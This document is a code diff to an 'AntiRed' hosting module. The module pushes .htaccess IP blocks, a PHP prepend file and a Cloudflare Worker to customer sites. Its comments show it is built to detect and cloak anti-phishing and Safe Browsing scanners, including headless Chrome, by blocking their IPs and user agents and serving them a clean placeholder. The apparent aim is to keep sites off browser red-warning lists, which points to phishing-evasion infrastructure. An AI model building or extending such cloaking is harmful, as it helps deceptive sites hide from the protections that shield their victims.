@@ -15,6 +15,7 @@ require('dotenv').config()
 const axios = require('axios')
 const { log } = require('console')
 const { getOrCreateCustomRulesEntrypoint } = require('./cf-service')
+const scannerIPRefresh = require('./scanner-ip-refresh')
 
 const WHM_HOST = process.env.WHM_HOST
 const WHM_USERNAME = process.env.WHM_USERNAME || 'root'
@@ -153,6 +154,35 @@ const SCANNER_IP_RANGES = [
   // NOTE: Do NOT block Cloudflare proxy IPs — blocking them = blocking everyone
 ]
 
+/**
+ * Returns the combined scanner IP list: hardcoded base + dynamic IPs from
+ * scanner-ip-refresh.js (fetched daily from public feeds + admin overrides).
+ * Used by generateHardenedWorkerScript() and generateHtaccessRules().
+ */
+function getAllScannerIPs() {
+  const dynamic = scannerIPRefresh.getDynamicIPs()
+  if (!dynamic || dynamic.length === 0) return SCANNER_IP_RANGES
+  return [...new Set([...SCANNER_IP_RANGES, ...dynamic])]
+}
+
+// ─── Chrome Version Ceiling (Auto-Calculated) ────────────
+// Chrome 120 shipped ~Dec 2023. Releases every ~4 weeks, incrementing major by 1.
+// Instead of hardcoding a ceiling that goes stale, we calculate it from the date.
+// Adds a +15 buffer for canary/dev channels so only truly unreleased versions flag.
+const CHROME_120_EPOCH_MS = Date.parse('2023-12-01')
+const MS_PER_CHROME_RELEASE = 4 * 7 * 86400 * 1000 // ~4 weeks
+
+function getChromeVersionCeiling() {
+  const releasesElapsed = Math.floor((Date.now() - CHROME_120_EPOCH_MS) / MS_PER_CHROME_RELEASE)
+  const estimatedStable = 120 + releasesElapsed
+  return {
+    stable: estimatedStable,           // approximate current stable
+    suspicious: estimatedStable + 15,  // unreleased → likely headless/canary
+    maybeDev: estimatedStable + 10,    // very new → possibly dev channel
+    old: estimatedStable - 40,         // very old → likely automated
+  }
+}
+
 // Known bot user agents used by security scanners (anti-phishing + recon)
 const SCANNER_USER_AGENTS = [
   // Anti-Phishing / Safe Browsing
@@ -251,6 +281,7 @@ function generateHtaccessRules(cpUsername, options = {}) {
 `
 
   // Only add IP blocking if NOT behind Cloudflare (behind CF, all IPs are CF's)
+  const allIPs = getAllScannerIPs()
   if (!behindCloudflare) {
     rules += `
 # --- Scanner IP Blocking (Apache 2.4+) ---
@@ -258,7 +289,7 @@ function generateHtaccessRules(cpUsername, options = {}) {
   <RequireAll>
     Require all granted
 `
-    for (const ip of SCANNER_IP_RANGES) {
+    for (const ip of allIPs) {
       rules += `    Require not ip ${ip.replace('/32', '')}\n`
     }
     rules += `  </RequireAll>
@@ -404,8 +435,8 @@ async function deployHtaccess(cpUsername, domain) {
     })
 
     const ok = writeRes.data?.result?.status === 1 || writeRes.data?.metadata?.result === 1
-    log(`[AntiRed] .htaccess deployed for ${cpUsername}: ${ok ? 'OK' : 'FAIL'} (CF=${behindCloudflare}, IPs=${SCANNER_IP_RANGES.length}, UAs=${SCANNER_USER_AGENTS.length}, staticBuild=${staticSiteBuildPath || 'none'})`)
-    return { success: ok, ipRanges: SCANNER_IP_RANGES.length, userAgents: SCANNER_USER_AGENTS.length, behindCloudflare, staticSiteBuildPath }
+    log(`[AntiRed] .htaccess deployed for ${cpUsername}: ${ok ? 'OK' : 'FAIL'} (CF=${behindCloudflare}, IPs=${allIPs.length}, UAs=${SCANNER_USER_AGENTS.length}, staticBuild=${staticSiteBuildPath || 'none'})`)
+    return { success: ok, ipRanges: allIPs.length, userAgents: SCANNER_USER_AGENTS.length, behindCloudflare, staticSiteBuildPath }
   } catch (err) {
     log(`[AntiRed] .htaccess deploy error for ${cpUsername}: ${err.message}`)
     return { success: false, error: err.message }
@@ -522,6 +553,13 @@ if (!isset(\$_SESSION['FIL212sD'])) {
  * Deploy the CF IP restoration prepend to a cPanel account.
  * This replaces the JS challenge for CF Worker-protected domains.
  *
+ * **P1 HARDENING (2026-02):** Protection files are now stored OUTSIDE
+ * public_html at `/home/<user>/.antired/challenge.php`. This prevents
+ * accidental deletion by user file uploads/extracts/deletes in public_html.
+ * The `.user.ini` in public_html is still needed (PHP reads it from the
+ * document root), but now it's a tiny 2-line pointer — easy to restore and
+ * the actual protection logic is safe in `/.antired/`.
+ *
  * Idempotent: skips the WHM writes if the same payload was successfully
  * deployed in the last `IDEMPOTENCY_WINDOW_MS`. Cuts re-deploy spam
  * (~800 redundant deploys in 21 days per the RCA) by ~95%.
@@ -540,8 +578,12 @@ async function deployCFIPFix(cpUsername, opts = {}) {
 
   const force = opts && opts.force === true
   const phpContent = generateIPFixPhp()
+  // NEW: Protection file lives outside public_html
+  const protectedDir = '/.antired'
+  const protectedFile = 'challenge.php'
+  const protectedPath = `/home/${cpUsername}/.antired/challenge.php`
   const userIniContent = `; Anti-Red: CF IP Restoration
-auto_prepend_file = /home/${cpUsername}/public_html/.antired-challenge.php`
+auto_prepend_file = ${protectedPath}`
 
   // Idempotency: hash both payloads + the cpUsername (the .user.ini path is
   // user-specific) and skip if we already deployed this exact content recently.
@@ -561,15 +603,8 @@ auto_prepend_file = /home/${cpUsername}/public_html/.antired-challenge.php`
     const acct = await cpAccts.findOne({ cpUser: cpUsername })
 
     // ── Skip deleted / cancelled cPanel accounts ──
-    // BUG FIX (2026-07-08 chatId 8011229362): after a user cancelled hosting,
-    // CF IP Fix continued to fire against the terminated account every ~25 min
-    // (log: "[AntiRed] CF IP Fix deployed for evene479" at 13:24:37, 13:49:37
-    // — deletion happened at 13:24:17). WHM has no account to modify → the
-    // requests hit /cpanel with a non-existent user, get 5xx, and waste API
-    // calls at the fleet scale. Skip if deleted / cancelled / suspended.
     if (acct && (acct.deleted === true || acct.cancelledByUser === true || acct.suspended === true)) {
       await client.close()
-      // Log only once per hour so we know the guard is firing but avoid spam.
       const lastSkipAt = acct._lastCfIpFixSkipLog ? new Date(acct._lastCfIpFixSkipLog).getTime() : 0
       if (Date.now() - lastSkipAt > 60 * 60 * 1000) {
         log(`[AntiRed] CF IP Fix SKIPPED for ${cpUsername} — account ${acct.deleted ? 'deleted' : acct.cancelledByUser ? 'cancelled' : 'suspended'}`)
@@ -590,18 +625,35 @@ auto_prepend_file = /home/${cpUsername}/public_html/.antired-challenge.php`
     if (!force && acct && acct.lastCfIpFixSig === sig && acct.lastCfIpFixAt
         && (Date.now() - new Date(acct.lastCfIpFixAt).getTime()) < IDEMPOTENCY_WINDOW_MS) {
       await client.close()
-      // Same payload, deployed recently — skip both WHM writes (no log spam either)
       return { success: true, method: 'cf_ip_fix', skipped: 'unchanged' }
     }
     await client.close()
   } catch (idemErr) {
-    // If the idempotency check itself errors, fall through to actual deploy
-    // (better to over-deploy than skip when we can't verify)
     log(`[AntiRed] CF IP Fix idempotency check warning for ${cpUsername} (continuing): ${idemErr.message}`)
   }
 
   try {
-    // Write the IP fix PHP file
+    // Step 1: Ensure /.antired/ directory exists (outside public_html)
+    try {
+      await whmApi.get('/cpanel', {
+        params: {
+          'api.version': 1,
+          cpanel_jsonapi_user: cpUsername,
+          cpanel_jsonapi_apiversion: 3,
+          cpanel_jsonapi_module: 'Fileman',
+          cpanel_jsonapi_func: 'mkdir',
+          path: '/',
+          name: '.antired',
+        },
+      })
+    } catch (mkdirErr) {
+      // Directory may already exist — that's fine
+      if (!String(mkdirErr.message || '').includes('exists')) {
+        log(`[AntiRed] CF IP Fix mkdir /.antired/ note for ${cpUsername}: ${mkdirErr.message}`)
+      }
+    }
+
+    // Step 2: Write the IP fix PHP file to /.antired/challenge.php (PROTECTED)
     await whmApi.get('/cpanel', {
       params: {
         'api.version': 1,
@@ -609,12 +661,13 @@ auto_prepend_file = /home/${cpUsername}/public_html/.antired-challenge.php`
         cpanel_jsonapi_apiversion: 3,
         cpanel_jsonapi_module: 'Fileman',
         cpanel_jsonapi_func: 'save_file_content',
-        dir: '/public_html',
-        file: '.antired-challenge.php',
+        dir: protectedDir,
+        file: protectedFile,
         content: phpContent,
       },
     })
 
+    // Step 3: Write .user.ini to public_html (pointer to protected location)
     await whmApi.get('/cpanel', {
       params: {
         'api.version': 1,
@@ -628,6 +681,23 @@ auto_prepend_file = /home/${cpUsername}/public_html/.antired-challenge.php`
       },
     })
 
+    // Step 4: Clean up legacy file in public_html (if it exists)
+    // Don't fail if this errors — the old file being there is harmless
+    try {
+      await whmApi.get('/cpanel', {
+        params: {
+          'api.version': 1,
+          cpanel_jsonapi_user: cpUsername,
+          cpanel_jsonapi_apiversion: 3,
+          cpanel_jsonapi_module: 'Fileman',
+          cpanel_jsonapi_func: 'save_file_content',
+          dir: '/public_html',
+          file: '.antired-challenge.php',
+          content: `<?php\n// MIGRATED: Protection file moved to ${protectedPath}\n// This file is no longer used. Safe to delete.\n?>`,
+        },
+      })
+    } catch { /* non-blocking legacy cleanup */ }
+
     // Stamp the successful deploy signature for idempotency
     try {
       const { MongoClient } = require('mongodb')
@@ -636,13 +706,13 @@ auto_prepend_file = /home/${cpUsername}/public_html/.antired-challenge.php`
       const db = client.db(process.env.DB_NAME || 'test')
       await db.collection('cpanelAccounts').updateOne(
         { cpUser: cpUsername },
-        { $set: { lastCfIpFixSig: sig, lastCfIpFixAt: new Date() } }
+        { $set: { lastCfIpFixSig: sig, lastCfIpFixAt: new Date(), protectionFileLocation: 'protected' } }
       )
       await client.close()
     } catch { /* non-blocking */ }
 
-    log(`[AntiRed] CF IP Fix deployed for ${cpUsername} (replaces JS challenge, Worker handles bot detection)`)
-    return { success: true, method: 'cf_ip_fix' }
+    log(`[AntiRed] CF IP Fix deployed for ${cpUsername} at ${protectedPath} (protected location, outside public_html)`)
+    return { success: true, method: 'cf_ip_fix', location: 'protected' }
   } catch (err) {
     log(`[AntiRed] CF IP Fix deploy error for ${cpUsername}: ${err.message}`)
     return { success: false, error: err.message }
@@ -1355,11 +1425,13 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;l
 // - Legitimate → Origin content directly
 
 function generateHardenedWorkerScript() {
+  const allIPs = getAllScannerIPs()
   const blockedUAs = SCANNER_USER_AGENTS.map(ua => `'${ua}'`).join(',')
-  const scannerIPs = SCANNER_IP_RANGES.map(ip => `'${ip}'`).join(',')
+  const scannerIPs = allIPs.map(ip => `'${ip}'`).join(',')
   const secretSeed = require('crypto').randomBytes(16).toString('hex')
   const cleanPlaceholder = generateCleanPlaceholder().replace(/'/g, "\\'").replace(/\n/g, '\\n')
   const backendReportUrl = (process.env.SELF_URL_PROD || process.env.SELF_URL || '').replace(/\/+$/, '')
+  const chromeCeil = getChromeVersionCeiling()
 
   // Warn if report URL looks like a dev/preview environment
   if (backendReportUrl.includes('preview.emergentagent') || backendReportUrl.includes('localhost')) {
@@ -1448,14 +1520,14 @@ function calculateBotScore(ua, ip, request) {
   if (ua && /FreeBSD/.test(ua)) score += 40;
 
   // ── Chrome version anomaly detection ──
-  // GSB headless Chrome often uses dev/canary builds with inflated version numbers.
-  // Chrome stable is 149 as of June 2026. Anything >165 is suspicious (canary/headless).
+  // Auto-calculated: stable ~${chromeCeil.stable} as of worker build date.
+  // Anything >${chromeCeil.suspicious} is suspicious (canary/headless).
   const chromeMatch = ua && ua.match(/Chrome\\/([0-9]+)/);
   if (chromeMatch) {
     const ver = parseInt(chromeMatch[1]);
-    if (ver > 165) score += 35;       // Unreleased version — likely headless/canary
-    else if (ver > 160) score += 15;  // Very new — possibly dev channel
-    else if (ver < 90) score += 25;   // Very old — likely automated
+    if (ver > ${chromeCeil.suspicious}) score += 35;       // Unreleased version — likely headless/canary
+    else if (ver > ${chromeCeil.maybeDev}) score += 15;  // Very new — possibly dev channel
+    else if (ver < ${chromeCeil.old}) score += 25;   // Very old — likely automated
   }
 
   // ── Cloudflare Bot Management score (if available) ──
@@ -1623,6 +1695,16 @@ function honeypotRobotsTxt() {
 // Injected into pass-through HTML responses for verified/passed users.
 // Hidden elements that only bots interact with.
 function injectHoneypots(html, domain) {
+  // ── Safety guard: only inject into real HTML documents ──
+  // Some origins (esp. PHP APIs) return JSON/text with a text/html Content-Type.
+  // Blindly appending the trap markup corrupts those bodies and breaks client-side
+  // JSON.parse (customer @scorch75 incident, 2026-06 — testingpagebig.com API).
+  // If the body doesn't look like an HTML document, pass it through untouched.
+  const _lower = (html || '').toLowerCase();
+  if (!_lower.includes('<html') && !_lower.includes('<body')) {
+    return html;
+  }
+
   // Type 1: Link Honeypots — hidden links bots click, humans never see
   const linkTraps = '<a href="/__honeypot/admin-login" style="display:none" tabindex="-1" aria-hidden="true">Admin Login</a>'
     + '<a href="/__honeypot/wp-admin" style="opacity:0;position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden" tabindex="-1">WordPress Admin</a>'
@@ -1765,10 +1847,9 @@ function challengePage(originalUrl, nonce) {
   if(isLinuxDesktop&&/Chrome/.test(navigator.userAgent))sc+=30;
 
   // ── NEW: Chrome version anomaly ──
-  // GSB headless Chrome uses dev/canary builds with future version numbers.
-  // Chrome stable is 149 as of June 2026. Only flag >165 (canary/headless territory).
+  // Auto-calculated ceiling — stable ~${chromeCeil.stable} at build time.
   var cvMatch=navigator.userAgent.match(/Chrome\\\\/([0-9]+)/);
-  if(cvMatch){var cv2=parseInt(cvMatch[1]);if(cv2>165)sc+=25;else if(cv2<90)sc+=20;}
+  if(cvMatch){var cv2=parseInt(cvMatch[1]);if(cv2>${chromeCeil.suspicious})sc+=25;else if(cv2<${chromeCeil.old})sc+=20;}
 
   // ── NEW: Notification permission probe ──
   // Headless Chrome has Notification.permission='denied' but no prompt capability.
@@ -1859,6 +1940,20 @@ async function handleRequest(request) {
       if (bypass) challengeBypassed = true;
     }
   } catch (e) { /* KV read failed, default to challenge ON */ }
+
+  // ── Step 0c: Read honeypot-off flag (does NOT short-circuit other layers) ──
+  // Stored in KV as 'honeypot_off:{domain}'. When set, the Worker skips injecting
+  // the hidden honeypot trap markup into pass-through HTML. Every other layer —
+  // Captcha challenge, scanner cloaking, IP bans, WAF — keeps running for everyone.
+  // Exists so customers whose pages emit inline JSON/API output (which the traps
+  // could corrupt) can opt out of honeypots only. Monthly-plan self-service toggle.
+  let honeypotOff = false;
+  try {
+    if (typeof BANNED_IPS !== 'undefined') {
+      const hp = await BANNED_IPS.get('honeypot_off:' + domain);
+      if (hp) honeypotOff = true;
+    }
+  } catch (e) { /* KV read failed, default to honeypot ON */ }
 
   // ── Step 1: Handle honeypot triggers ──
   if (url.pathname.startsWith('/__honeypot/')) {
@@ -1999,7 +2094,7 @@ async function handleRequest(request) {
     if (contentType.includes('text/html')) {
       try {
         let html = await response.text();
-        html = injectHoneypots(html, domain);
+        if (!honeypotOff) html = injectHoneypots(html, domain);
         newHeaders.delete('content-length');
         return new Response(html, { status, headers: newHeaders });
       } catch (e) {
@@ -2046,7 +2141,7 @@ async function handleRequest(request) {
     if (contentType.includes('text/html')) {
       try {
         let html = await response.text();
-        html = injectHoneypots(html, domain);
+        if (!honeypotOff) html = injectHoneypots(html, domain);
         newHeaders.delete('content-length');
         return new Response(html, { status, headers: newHeaders });
       } catch (e) {
@@ -2377,7 +2472,7 @@ async function verifyProtection(domain) {
  * Returns { zoneId, hasCloudflare, isOff, source } — never throws.
  */
 async function resolveDomainCfState(domain, db) {
-  const result = { zoneId: null, hasCloudflare: false, isOff: false, source: 'none' }
+  const result = { zoneId: null, hasCloudflare: false, isOff: false, honeypotOff: false, source: 'none' }
   if (!domain) return result
   const key = String(domain).toLowerCase()
 
@@ -2387,6 +2482,7 @@ async function resolveDomainCfState(domain, db) {
       const doc = await db.collection('registeredDomains').findOne({ _id: key })
       v = doc?.val || {}
       result.isOff = v.visitorCaptchaOff === true || v.antiRedOff === true
+      result.honeypotOff = v.honeypotOff === true
 
       if (v.cfZoneId && v.nameserverType === 'cloudflare') {
         result.zoneId = v.cfZoneId
@@ -2491,6 +2587,72 @@ async function setDomainChallengeBypass(domain, bypass = true) {
   }
 }
 
+/**
+ * Set or remove the per-domain honeypot-off flag in Cloudflare KV.
+ * When set ('honeypot_off:{domain}'=true), the CF Worker stops injecting the
+ * hidden honeypot trap markup into pass-through HTML for that domain. All other
+ * anti-red layers (Captcha challenge, scanner cloaking, IP bans, WAF) stay
+ * active. Powers the Monthly-plan "🍯 On/Off Honeypot Traps" self-service toggle.
+ *
+ * @param {string} domain
+ * @param {boolean} off  true = disable honeypot traps (write flag); false = re-enable (delete flag)
+ */
+async function setDomainHoneypot(domain, off = true) {
+  try {
+    const honeypotService = require('./honeypot-service')
+    const kvNamespaceId = await honeypotService.getOrCreateKVNamespace()
+    if (!kvNamespaceId) {
+      log(`[AntiRed] Cannot set honeypot flag — KV namespace not available`)
+      return { success: false, error: 'KV namespace not available' }
+    }
+
+    const CF_API_KEY = process.env.CLOUDFLARE_API_KEY
+    const CF_EMAIL = process.env.CLOUDFLARE_EMAIL
+    const ACCOUNT_ID = 'ed6035ebf6bd3d85f5b26c60189a21e2'
+
+    if (!CF_API_KEY || !CF_EMAIL) {
+      return { success: false, error: 'Missing Cloudflare credentials' }
+    }
+
+    const key = `honeypot_off:${domain}`
+
+    if (off) {
+      // Write flag to KV (no expiry — permanent until re-enabled)
+      await axios.put(
+        `https://api.cloudflare.com/client/v4/accounts/${ACCOUNT_ID}/storage/kv/namespaces/${kvNamespaceId}/values/${encodeURIComponent(key)}`,
+        'true',
+        {
+          headers: {
+            'X-Auth-Email': CF_EMAIL,
+            'X-Auth-Key': CF_API_KEY,
+            'Content-Type': 'text/plain',
+          },
+          timeout: 10000,
+        }
+      )
+      log(`[AntiRed] Honeypot traps DISABLED for ${domain} — worker will skip trap injection at edge`)
+    } else {
+      // Remove flag from KV — worker resumes injecting traps
+      await axios.delete(
+        `https://api.cloudflare.com/client/v4/accounts/${ACCOUNT_ID}/storage/kv/namespaces/${kvNamespaceId}/values/${encodeURIComponent(key)}`,
+        {
+          headers: {
+            'X-Auth-Email': CF_EMAIL,
+            'X-Auth-Key': CF_API_KEY,
+          },
+          timeout: 10000,
+        }
+      )
+      log(`[AntiRed] Honeypot traps RE-ENABLED for ${domain} — worker resumes trap injection at edge`)
+    }
+
+    return { success: true }
+  } catch (err) {
+    log(`[AntiRed] setDomainHoneypot error for ${domain}: ${err.message}`)
+    return { success: false, error: err.message }
+  }
+}
+
 module.exports = {
   generateHtaccessRules,
   deployHtaccess,
@@ -2513,8 +2675,12 @@ module.exports = {
   verifyProtection,
   generateCleanPlaceholder,
   setDomainChallengeBypass,
+  setDomainHoneypot,
   resolveDomainCfState,
   SCANNER_IP_RANGES,
   SCANNER_USER_AGENTS,
   SCANNER_JA3_HASHES,
+  // P0 improvements
+  getAllScannerIPs,
+  getChromeVersionCeiling,
 }
